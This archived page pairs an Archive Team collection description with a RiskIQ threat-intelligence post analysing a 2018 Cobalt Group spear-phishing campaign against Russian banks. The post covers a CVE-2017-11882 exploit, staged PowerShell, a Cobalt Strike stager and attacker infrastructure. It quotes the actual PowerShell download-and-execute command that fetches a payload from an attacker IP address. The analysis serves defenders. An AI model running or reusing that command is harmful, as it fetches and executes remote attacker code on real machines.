	  <img align=right src="http://archiveteam.org/images/e/e6/Archiveteam.jpg" width=200> Formed in 2009, the Archive Team (not to be confused with the archive.org Archive-It Team) is a rogue archivist collective dedicated to saving copies of rapidly dying or deleted websites for the sake of history and digital heritage. The group is 100% composed of volunteers and interested parties, and has expanded into a large amount of related projects for saving online and digital history.
<p>
History is littered with hundreds of conflicts over the future of a community, group, location or business that were "resolved" when one of the parties stepped ahead and destroyed what was there. With the original point of contention destroyed, the debates would fall to the wayside. Archive Team believes that by duplicated condemned data, the conversation and debate can continue, as well as the richness and insight gained by keeping the materials. Our projects have ranged in size from a single volunteer downloading the data to a small-but-critical site, to over 100 volunteers stepping forward to acquire terabytes of user-created data to save for future generations.
<p>
The main site for Archive Team is at <a href="http://www.archiveteam.org">archiveteam.org</a> and contains up to the date information on various projects, manifestos, plans and walkthroughs.
<p>
This collection contains the output of many Archive Team projects, both ongoing and completed. Thanks to the generous providing of disk space by the Internet Archive, multi-terabyte datasets can be made available, as well as in use by the <a href="http://archive.org/web/web.php">Wayback Machine</a>, providing a path back to lost websites and work. 
<p>
Our collection has grown to the point of having sub-collections for the type of data we acquire. If you are seeking to browse the contents of these collections, the Wayback Machine is the best first stop. Otherwise, you are free to dig into the stacks to see what you may find.
<p>
<b>The Archive Team Panic Downloads</b> are full pulldowns of currently extant websites, meant to serve as emergency backups for needed sites that are in danger of closing, or which will be missed dearly if suddenly lost due to hard drive crashes or server failures. 
<p>

		<div>Collection: <a style="color:#33f;" href="https://archive.org/details/archivebot" target="_new"><span class="wm-title">ArchiveBot: The Archive Team Crowdsourced Crawler</span></a></div>
		<div style="max-height:75px;overflow:hidden;position:relative;">
	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
	  ArchiveBot is an IRC bot designed to automate the archival of smaller websites (e.g. up to a few hundred thousand URLs). You give it a URL to start at, and it grabs all content under that URL, records it in a WARC, and then uploads that WARC to ArchiveTeam servers for eventual injection into the Internet Archive (or other archive sites).
<p>
To use ArchiveBot, drop by #archivebot on EFNet. To interact with ArchiveBot, you issue commands by typing it into the channel. Note you will need channel operator permissions in order to issue archiving jobs. The dashboard shows the sites being downloaded currently.
<p>
There is a dashboard running for the archivebot process at <a href="http://www.archivebot.com">http://www.archivebot.com</a>.
<p>
ArchiveBot's source code can be found at <a href="https://github.com/ArchiveTeam/ArchiveBot">https://github.com/ArchiveTeam/ArchiveBot</a>.

                        <h3 class="article-title">First Activities of Cobalt Group in 2018: Spear Phishing Russian Banks</h3>
                        <h5 class="article-date-author">
                            <div class="date"> January 16, 2018</div>
                            <div class="author"> Yonathan Klijnsma</div>
                        </h5>

                    </div>

                    <div class="new-blog-content">
                        <div class="blog-wrap">
                            <div class="featured-image">
                                <img src="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2017/06/rsz_istock-483786071.jpg ">
                            </div>

                            <div class="at-above-post addthis_tool" data-url="https://web.archive.org/web/20190508170147oe_/https://www.riskiq.com/blog/labs/cobalt-group-spear-phishing-russian-banks/"></div><p><span style="font-weight: 400;">Last year November, we </span><a href="https://web.archive.org/web/20190508170147/https://www.riskiq.com/blog/labs/cobalt-strike/"><span style="font-weight: 400;">documented activities of the Cobalt Group using CVE-2017-11882</span></a><span style="font-weight: 400;">. In December they were already setting up for their next campaign. Today, on January 16th, the first wave of spear phishing emails were delivered to the inboxes of Russian banks. Sadly, this time around, the group didn’t </span><a href="https://web.archive.org/web/20190508170147/https://twitter.com/ydklijnsma/status/846766178093731840"><span style="font-weight: 400;">forget to BCC</span></a><span style="font-weight: 400;">.</span><span style="font-weight: 400;"><br/>
</span><span style="font-weight: 400;"><br/>
</span><span style="font-weight: 400;">The emails were sent in the name of a large European bank in an attempt to social engineer the receiver into trusting the email. The emails were quite plain with only a single question in the body and an attachment with the name </span><a href="https://web.archive.org/web/20190508170147/https://virustotal.com/en/file/8a57464c93d4f6d85e51e07748d4ffcc0b9e6b5a64642aec859040d1606fd0f8/analysis/"><span style="font-weight: 400;">once.rtf</span></a><span style="font-weight: 400;">. In other cases, we saw a file with the name </span><a href="https://web.archive.org/web/20190508170147/https://virustotal.com/en/file/8a57464c93d4f6d85e51e07748d4ffcc0b9e6b5a64642aec859040d1606fd0f8/analysis/"><span style="font-weight: 400;">Заявление.rtf</span></a> <span style="font-weight: 400;">attached to an email that was also written in Russian:</span></p>
<div id="attachment_13862" style="width: 810px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-13862" class="wp-image-13862 size-full" src="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image4-16.png" alt="The first wave of spear phishing emails was delivered to the inboxes of Russian banks. Sadly, this time around, the Cobalt Group didn’t forget to BCC." width="800" height="298" srcset="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image4-16.png 800w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image4-16-300x112.png 300w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image4-16-768x286.png 768w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image4-16-500x186.png 500w" sizes="(max-width: 800px) 100vw, 800px"/><p id="caption-attachment-13862" class="wp-caption-text">Fig-1 Example of spear phishing email</p></div>
<p><span style="font-weight: 400;">The emails were sent from addresses on the domains </span><span style="font-weight: 400;">bankosantantder.com</span><span style="font-weight: 400;"> and </span><span style="font-weight: 400;">billing-cbr.ru</span><span style="font-weight: 400;">, which were both set up for this campaign specifically.</span></p>
<h4><span style="font-weight: 400;">Analysis</span></h4>
<p><span style="font-weight: 400;">The attachment abuses CVE-2017-11882 to start PowerShell with the following command:</span></p>
<p><em><span style="font-weight: 400;">powershell -nop -w hidden -c &#8220;IEX ((new-object net.webclient).downloadstring(&#8216;http://46.21.147.61:80/a&#8217;))&#8221;</span></em></p>
<p><span style="font-weight: 400;">This command downloads and executes a second stage, which is also a PowerShell script, but encoded:</span></p>
<div id="attachment_13863" style="width: 810px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-13863" class="wp-image-13863 size-full" src="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image2-21.png" alt="The first wave of spear phishing emails was delivered to the inboxes of Russian banks. Sadly, this time around, the Cobalt Group didn’t forget to BCC." width="800" height="418" srcset="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image2-21.png 800w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image2-21-300x157.png 300w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image2-21-768x401.png 768w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image2-21-500x261.png 500w" sizes="(max-width: 800px) 100vw, 800px"/><p id="caption-attachment-13863" class="wp-caption-text">Fig-2 Second stage</p></div>
<p><span style="font-weight: 400;">This script decodes to the third stage of the attack, another PowerShell script. This stage-three script is used to load a small piece of embedded shellcode into memory and run it like so:</span><span style="font-weight: 400;"><br/>
</span></p>
<div id="attachment_13864" style="width: 810px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-13864" class="wp-image-13864 size-full" src="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image3-20.png" alt="The first wave of spear phishing emails was delivered to the inboxes of Russian banks. Sadly, this time around, the Cobalt Group didn’t forget to BCC." width="800" height="329" srcset="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image3-20.png 800w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image3-20-300x123.png 300w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image3-20-768x316.png 768w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image3-20-500x206.png 500w" sizes="(max-width: 800px) 100vw, 800px"/><p id="caption-attachment-13864" class="wp-caption-text">Fig-3 Stage-three script</p></div>
<p><span style="font-weight: 400;">The shellcode starts the Cobalt Strike stager in a new threat and starts it up. This stager will initiate connectivity with the C2 server to install the Cobalt Strike implant.</span></p>
<h4><span style="font-weight: 400;">Infrastructure</span></h4>
<p><span style="font-weight: 400;">As shown, the stager beacons out to </span><a href="https://web.archive.org/web/20190508170147/https://community.riskiq.com/search/helpdesk-oracle.com"><span style="font-weight: 400;">helpdesk-oracle.com</span></a><span style="font-weight: 400;">, which was registered by a person using the email address </span><a href="https://web.archive.org/web/20190508170147/https://community.riskiq.com/search/whois/email/krystianwalczak@yandex.com"><span style="font-weight: 400;">krystianwalczak@yandex.com</span></a><span style="font-weight: 400;">. This email address pointed us to another domain, which was registered on the same date and follows a similar pattern:</span></p>
<div id="attachment_13865" style="width: 810px" class="wp-caption aligncenter"><img aria-describedby="caption-attachment-13865" class="wp-image-13865 size-full" src="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image1-18.png" alt="The first wave of spear phishing emails was delivered to the inboxes of Russian banks. Sadly, this time around, the Cobalt Group didn’t forget to BCC." width="800" height="126" srcset="https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image1-18.png 800w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image1-18-300x47.png 300w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image1-18-768x121.png 768w, https://web.archive.org/web/20190508170147im_/https://cdn.riskiq.com/wp-content/uploads/2018/01/rsz_image1-18-500x79.png 500w" sizes="(max-width: 800px) 100vw, 800px"/><p id="caption-attachment-13865" class="wp-caption-text">Fig-4 WHOIS information for the malicious email addresses</p></div>
<p><span style="font-weight: 400;">Right now, the server to which the domain </span><a href="https://web.archive.org/web/20190508170147/https://community.riskiq.com/search/help-desc-me.com"><span style="font-weight: 400;">help-desc-me.com</span></a><span style="font-weight: 400;"> points doesn’t seem to be active, nor have we seen any malicious samples connect to it. We have marked it as malicious and listed it in the IOCs below, as we believe it will be part of either a next stage of the attack shown above or used in the next wave of spear phishing emails.</span></p>
<h4><span style="font-weight: 400;">Indicators of Compromise (IOC)</span></h4>
<p><span style="font-weight: 400;">All of the IOCs listed below are also available in the RiskIQ Community Public Project located here: </span><a href="https://web.archive.org/web/20190508170147/https://community.riskiq.com/projects/f0cd2fc9-a361-2a4c-4489-a21ddf98349b"><span style="font-weight: 400;">https://community.riskiq.com/projects/f0cd2fc9-a361-2a4c-4489-a21ddf98349b</span></a></p>
<p><span style="font-weight: 400;">We have not added the hashes of the staging scripts because they do not appear on the system itself—they live in memory during the initial stages of the attack.</span></p>
